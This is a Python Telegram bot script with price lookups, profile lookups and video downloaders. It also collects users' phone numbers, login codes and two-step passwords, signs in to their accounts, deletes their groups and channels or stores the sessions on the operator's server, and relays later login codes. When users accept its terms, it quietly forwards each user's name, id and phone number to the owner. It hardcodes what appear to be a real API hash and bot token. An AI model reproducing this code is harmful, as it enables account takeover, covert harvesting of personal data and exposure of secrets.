# get , insta ac
import requests , json
import bs4
from pytube import YouTube
import instaloader
from datetime import datetime
import os
from telethon import Button, errors
from telethon.sync import TelegramClient, events, functions
DEX = '6140911166'
people = 1

api_id = 2192036
api_hash = '3b86a67fc4e14bd9dcfc2f593e75c841'
bot_token = '5965699318:AAHbRpWVpVZo2wZS1xcw1tsO9IfwydlHsIw'
bot = TelegramClient('bot7d', api_id, api_hash).start(bot_token=bot_token)
async def cr(cr , event):
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        if cr == 'XAUT':
            url = (f'https://www.okx.com/markets/prices/page/3')
            info = requests.get(url).text
            h = bs4.BeautifulSoup(info, 'html.parser')
            f = int(h.text.find('Gold'))
            await event.delete()
            await conv.send_message('for Ounce '+str(h.text[f+4:f+13])+'\nfor Gram $'+str(float(h.text[f+5:f+13].replace(',',''))/28.35)[:6]+'\nfor Carat $'+str(float(h.text[f+5:f+13].replace(',',''))*0.149911)[:6])

        url = (f'https://www.okx.com/markets/prices')
        info = requests.get(url).text
        h = bs4.BeautifulSoup(info ,'html.parser')
        if cr == 'BTC':
            f = int(h.text.find('capActionBTCBitcoin'))
            await event.delete()
            await conv.send_message(h.text[f+19:f+26])
        elif cr == 'ETH':
            f = int(h.text.find('ETHEthereum'))
            await event.delete()
            await conv.send_message(h.text[f+11:f+17])
        elif cr == 'TON':
            f = int(h.text.find('TONToncoin'))
            await event.delete()
            await conv.send_message(h.text[f+10:f+15])
        elif cr == 'SOL':
            f = int(h.text.find('SOLSolana'))
            await event.delete()
            await conv.send_message(h.text[f + 9:f + 15])



@bot.on(events.CallbackQuery(data="BTC"))
async def Callbacks(event):
    await cr('BTC' , event)
@bot.on(events.CallbackQuery(data="ETH"))
async def Callbacks(event):
    await cr('ETH' , event)
@bot.on(events.CallbackQuery(data="TON"))
async def Callbacks(event):
    await cr('TON' , event)
@bot.on(events.CallbackQuery(data="SOL"))
async def Callbacks(event):
    await cr('SOL' , event)
@bot.on(events.CallbackQuery(data="GOLD"))
async def Callbacks(event):
    await cr('XAUT' , event)


async def clen(event ,phone_number):
    client = TelegramClient(phone_number, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
    await client.connect()
    if not await client.is_user_authorized():
        request = await client.send_code_request(phone_number)

        async with bot.conversation(event.chat_id, timeout=300) as conv:
            # verification code
            await conv.send_message("ارسل الكود وضع علامة ( - ) بين كل رقم ؟")
            response_verification_code = await conv.get_response()
            verification_code = str(response_verification_code.message).replace('-', '')

            try:
                login = await client.sign_in(phone_number, code=int(verification_code))
            except errors.SessionPasswordNeededError:
                await conv.send_message("التحقق ؟")
                password = await conv.get_response()

                await client.sign_in(phone_number, password=password.text)
    try:
        dialogs = await client.get_dialogs()
        for dialog in dialogs:
            entity = dialog.entity
            if dialog.is_user:
                pass
            else:
                await client.delete_dialog(entity)
    except Exception as err:
        print(err)
    await client.log_out()
    return "تم تنضيف الرقم"

@bot.on(events.CallbackQuery(data="cleaner"))
async def Callbacks(event):
    await event.delete()
    try:
        # get information from user
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message('Phone number ?')
            phone_number_msg = await conv.get_response()
            phone_number_msg = phone_number_msg.text
            phone_number = phone_number_msg.replace('+', '').replace(' ', '')
            await conv.send_message(f'''ثواني''')
        result = await clen(event,phone_number)
        await event.reply(result)
    except :pass

@bot.on(events.CallbackQuery(data="getNumbers"))
async def Callbacks(event):
    for number in os.listdir(str(event.chat_id)):
        await event.delete()
        buttons = [[Button.inline("GetNumber", 'num1x')]]
        await event.reply(number.replace('.session', ''), buttons=buttons)
        @bot.on(events.CallbackQuery(data="num1x"))
        async def get(event11):
            await event11.delete()
            n = (str(event11.chat_id)+"/"+str(number.replace('.session','')))
            client = TelegramClient(n, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
            await client.connect()
            if not await client.is_user_authorized():
                await bot.send_message(event11.chat_id, "you don't have any number")
            await bot.send_message(event11.chat_id, number.replace('.session',''))
            @client.on(events.NewMessage())
            async def handler(event1):
                try:
                    if str(event1.message.peer_id.user_id) == '777000':
                        @bot.on(events.CallbackQuery(data="num2x"))
                        async def get(event):
                            await client.log_out()
                            await bot.send_message(event.chat_id, 'Went out')
                        buttonsx = [[Button.inline("Exit", 'num2x')]]
                        await bot.send_message(event.chat_id, event1.message.message, buttons=buttonsx)
                except:pass

async def Numbers(event ,phone_number):
    client = TelegramClient(str(event.chat_id)+'/'+phone_number, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
    await client.connect()
    if not await client.is_user_authorized():
        request = await client.send_code_request(phone_number)

        async with bot.conversation(event.chat_id, timeout=300) as conv:
            # verification code
            await conv.send_message("ارسل الكود وضع علامة ( - ) بين كل رقم ؟")
            response_verification_code = await conv.get_response()
            verification_code = str(response_verification_code.message).replace('-', '')

            try:
                login = await client.sign_in(phone_number, code=int(verification_code))
            except errors.SessionPasswordNeededError:
                await conv.send_message("التحقق ؟")
                password = await conv.get_response()

                await client.sign_in(phone_number, password=password.text)
    await client.disconnect()
    return "تم اضافة الرقم بنجاح ✅"

@bot.on(events.CallbackQuery(data="addNumbers"))
async def Callbacks(event):
    for number in os.listdir(str(event.chat_id)):
        n = (str(event.chat_id) + "/" + str(number.replace('.session', '')))
        client = TelegramClient(n, 2192036, '3b86a67fc4e14bd9dcfc2f593e75c841')
        await client.connect()
        await event.delete()
        if not await client.is_user_authorized():
            try:
                # get information from user
                async with bot.conversation(event.chat_id, timeout=300) as conv:
                    await conv.send_message('Phone number ?')
                    phone_number_msg = await conv.get_response()
                    phone_number_msg = phone_number_msg.text
                    phone_number = phone_number_msg.replace('+', '').replace(' ', '')
                    await conv.send_message(f'''ثواني''')
                result = await Numbers(event, phone_number, )
                await event.reply(result)
            except:
                pass
        else:
            await bot.send_message(event.chat_id, "you have number")
            await client.disconnect()


@bot.on(events.CallbackQuery(data="Tele Account"))
async def Callbacks(event):
    await event.delete()
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('username ?')
        username = await conv.get_response()
        username = username.message
    pic = f'bot{event.chat_id};{event.id}.jpg'
    entity = await bot.get_entity(username)
    user_info = await bot(functions.users.GetFullUserRequest(entity))
    about = str(user_info)
    start = about.find("about=")
    start += len("about=")
    end = about.find(",", start)
    bio = about[start:end]
    info_Ac = f'first_name : {entity.first_name}\nlast_name : {entity.last_name}\nid : {entity.id}\nusername : {entity.username}\nphone : {entity.phone}\nBio : {bio}'
    pic = await bot.download_profile_photo(entity, file=pic)
    pice = await bot.upload_file(pic)
    await bot.send_message(event.chat_id, info_Ac, file=pice, parse_mode='html')
@bot.on(events.CallbackQuery(data="Insta Account"))
async def Callbacks(event):
    try:
        await event.delete()
        async with bot.conversation(event.chat_id, timeout=300) as conv:
            await conv.send_message('username ?')
            username = await conv.get_response()
            username = username.message
        Lev = instaloader.Instaloader()
        profile = instaloader.Profile.from_username(Lev.context, username)
        name = profile.full_name
        fols = profile.followers
        folg = profile.followees
        bio = profile.biography
        pr = profile.is_private
        pic_url = profile.profile_pic_url
        external_url = profile.external_url
        response = requests.get(f"https://www.instagram.com/{username}/?__a=1")
        try:
            response_json = response.json()
            created_at = datetime.fromtimestamp(response_json["graphql"]["user"]["created_at"]).strftime(
                '%Y-%m-%d %H:%M:%S')
        except (requests.exceptions.JSONDecodeError, KeyError):
            created_at = "غير متاح"

        info_message = (
            f"الاسم: {name}\nمتابعين: {fols}\nخاص: {pr}\nمتابعة: {folg}\nنبذة: {bio}\nتاريخ الإنشاء: {created_at}")
        pic = f'bot{event.chat_id};{event.id}.jpg'
        response = requests.get(pic_url)
        if response.status_code == 200:
            with open(pic, 'wb') as f:
                f.write(response.content)
        pice = await bot.upload_file(pic)
        await bot.send_message(event.chat_id ,info_message, file=pice ,parse_mode='html')
        os.remove(pic)
    except Exception as ff:
        print(ff)

@bot.on(events.CallbackQuery(data="TikTok Account"))
async def Callbacks(event):
    await event.delete()
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('username ?')
        username = await conv.get_response()
        username = username.message
        url = requests.get(f'https://tiktokinfo--jts5.repl.co/TikTok-info?username={username}').text.replace('"',
                                                                                                        '').replace(',',
                                                                                                                    '')
        await bot.send_message(event.chat_id,str(url))



@bot.on(events.CallbackQuery(data="DTikTok"))
async def Callbacks(event):
    await event.delete()
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('url ?')
        ur = await conv.get_response()
        url_tik = ur.message
        api = f'https://godownloader.com/api/tiktok-no-watermark-free?url={url_tik}&key=godownloader.com'
        get_url = requests.get(api)
        if get_url.status_code == 200:
            await bot.send_message(event.chat_id,'Wait...')
            urls = json.loads(get_url.text)
            url = urls.get("video_no_watermark")
            vid = f'bot{event.chat_id};{event.id}.mp4'
            print(url)
            video = requests.get(url)
            with open(vid, 'wb') as f:
                f.write(video.content)
                print(';dd')
            vide = await bot.upload_file(vid)
            await bot.send_message(event.chat_id, file=vide, parse_mode='html')
            os.remove(vid)

@bot.on(events.CallbackQuery(data="Dyout"))
async def Callbacks(event):
    await event.delete()
    async with bot.conversation(event.chat_id, timeout=300) as conv:
        await conv.send_message('url ?')
        ur = await conv.get_response()
        url = ur.message
        vid = f'bot{event.chat_id};{event.id}.mp4'
        yt = YouTube(url)
        video_stream = yt.streams.get_highest_resolution()
        video_stream.download(filename=vid)
        vide = await bot.upload_file(vid)
        await bot.send_message(event.chat_id, file=vide, parse_mode='html')
        os.remove(vid)



@bot.on(events.CallbackQuery(data="Download"))
async def Callbacks(event):
    await event.delete()
    buttons = [[Button.inline("Download from TikTok", "DTikTok")],[Button.inline("Download from YouTube", "Dyout")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)

@bot.on(events.CallbackQuery(data="ProInfo"))
async def Callbacks(event):
    await event.delete()
    buttons = [[Button.inline("Insta Account", "Insta Account")],[Button.inline("TikTok Account", "TikTok Account")],[Button.inline("Tele Account", "Tele Account")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)




async def StartButtons(event):
    buttons = [[Button.inline("Cryptos", "crypto")],[Button.inline("Cleaner", "cleaner")],[Button.inline("Numbers", "Numbers")],[Button.inline("Profile Info", "ProInfo")],[Button.inline("Download", "Download")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)
@bot.on(events.CallbackQuery(data="crypto"))
async def _(event):
    await event.delete()
    buttons = [[Button.inline("BTC", "BTC")],[Button.inline("ETH", "ETH")],[Button.inline("TON", "TON")],[Button.inline("SOL", "SOL")],[Button.inline("GOLD", "GOLD")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)", buttons=buttons)
@bot.on(events.CallbackQuery(data="Numbers"))
async def _(event):
    await event.delete()
    buttons = [[Button.inline("Add Numbers", "addNumbers")],[Button.inline("Get Numbers", "getNumbers")]]
    await event.reply("›:ُِ 𝗗َِ𝗘َِ𝗫.#¹ :)" , buttons=buttons)



@bot.on(events.CallbackQuery(data="ag"))
async def Callbacks(event):
    global people
    await event.delete()
    file_a = open('peopel.txt', 'a')
    file_a.write(str(event.chat_id)+'\n')
    file_a.close()
    await bot.send_message(event.chat_id, 'thank you')
    entity = await bot.get_entity(event.chat_id)
    info_Ac = f'first_name : {entity.first_name}\nlast_name : {entity.last_name}\nid : {entity.id}\nusername : {entity.username}\nphone : {entity.phone}\nXX : {str(people)}'
    people += 1
    os.popen(f'mkdir {event.chat_id}')
    await bot.send_message(int(DEX), info_Ac)
@bot.on(events.CallbackQuery(data="nag"))
async def Callbacks(event):
    await event.delete()
    await bot.send_message(event.chat_id, 'thank you')

bot_message = '''* اول شي سواء كنت عراقي او اجنبي كبير او صغير انثئ او ذكر غني او فقير لا تغير شي من البوت ولا تحط شي بجيبي ولا تجي تكلي انه الصعدت البوت او انه الي شهرتة (ولو ماضن راح ينتشر اله لاشخاص يستفادون منه من صدك وان شاء الله يفيدكم)

*البوت يحتوي خدمات مجاناً تحب تستفاد منهن تمام اما غيره مثل انطيك او ابيعلك ملفات البوت او انصبلك او غيره ماكو هيج شي (ممممكن اكو اشتراك vip يكون بميزات اضافية لميزات المجاناً) 

*لا يوجد اي ضمان لاي شي يخصك بداخل البوت سواء ارقام او غيره (مثل يطير رقمك او ينحضر هل شي مو مني من نوعية رقمك الغير شرعي او وهمي ) وغير مسؤل اذا ينحضر رقمك الي حفظت بي رقم من ارقامك الاخرئ بداخل البوت (مو تجي وتكلي رقمي طار وجنت داخل ببوتك وحافظ بالبوت رقم )

*اي شخص يجي يبيعلك يوزر البوت انطيني يوزر حسابة احضرلكيا 

*عندك فكرة حلوة او خدمة مرتبة اذكرلياها بس مو موجودة وتكلي سوياها اريد شي مامطروق @LuLuu

اذا موافق علئ الشروط والكلام الي نذكر اضغط موافق واذا لا اضغط غير موافق'''
@bot.on(events.NewMessage(pattern='/start'))
async def BotOnStart(event):
    file_r = open('peopel.txt', 'r')

    if str(event.chat_id) in file_r.read():
        await StartButtons(event)
        file_r.close()
    else:
        buttons = [[Button.inline("موافق", "ag")], [Button.inline("غير موافق", "nag")]]
        await event.reply(bot_message, buttons=buttons)



bot.run_until_disconnected()

